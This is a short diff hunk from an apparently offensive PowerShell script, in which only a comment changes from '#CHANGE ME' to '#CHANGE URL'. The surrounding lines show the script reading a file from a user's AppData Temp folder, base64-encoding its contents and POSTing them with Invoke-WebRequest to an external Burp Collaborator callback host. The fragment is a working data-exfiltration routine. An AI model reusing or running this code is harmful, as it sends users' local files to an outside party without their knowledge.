@@ -21,7 +21,7 @@ if(Get-ChildItem -Path C:\Users\$username\AppData\Local\Temp | Where-Object { $_
 			$filecontentbytes = [System.Text.Encoding]::UTF8.GetBytes($filecontent)
 			$B64EncodedContent = [System.Convert]::ToBase64String($filecontentbytes)
 
-			$target = "https://fo70z55wxi56zxob33p9oiq8hznpbe.burpcollaborator.net"  #CHANGE ME
+			$target = "https://fo70z55wxi56zxob33p9oiq8hznpbe.burpcollaborator.net"  #CHANGE URL
 			$postParams = @{payload=$B64EncodedContent}
 			Invoke-WebRequest -Uri $target -Method POST -Body $postParams
 
